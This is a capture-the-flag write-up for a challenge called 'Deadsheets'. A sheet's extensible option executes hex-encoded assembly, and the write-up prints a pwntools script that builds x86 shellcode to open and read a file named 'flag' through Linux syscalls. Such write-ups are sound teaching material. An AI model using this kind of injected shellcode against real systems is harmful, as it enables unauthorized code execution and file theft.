# Deadsheets 
## Summary 
In this challenge the website we are given access to creates a "database"
sheet that is accessable online as a new file, the interesting aspect of 
this challenge is the fact that is has a extensible option when we add 
in data to the sheet. This option allows us to run any hex encoded assembly 
code which means we have arbitrary code execution access to the challenge.
However actually creating this payload is another story and requires some knowledge about how assembly works and especially how system calls within assembly works.

## Approach
Below is the payload that my team came up with for accessing the flag,
there is comments describing what each section is doing, however keep in
mind that the payload must not have the comments within in it for it to 
actually run properly.
```python
from pwn import *

from base64 import b64encode

bss_addr = 0x0804c060
flag_addr = bss_addr + 5 # address to push the flag to so we can access it

payload = asm(f"""
pushad
# setup for actually opening the flag file
mov eax, 0x5 
push 0x0
push 0x67616c66
mov ebx, esp
mov ecx, 0x0
mov edx, 0x0
int 0x80 # run the system call that is setup abover

# read the contents in the open file
mov ebx, eax
mov eax, 0x3
mov ecx, {flag_addr}
mov edx, 0x40
int 0x80 # run setup syscall to read file


# access the open syscall return so we can read the actual flag 
mov eax, {flag_addr}

# pop values at the end
pop esi
pop esi
popad
ret
""")
# encode payload so we can use it on the server
print(b64encode(payload))
```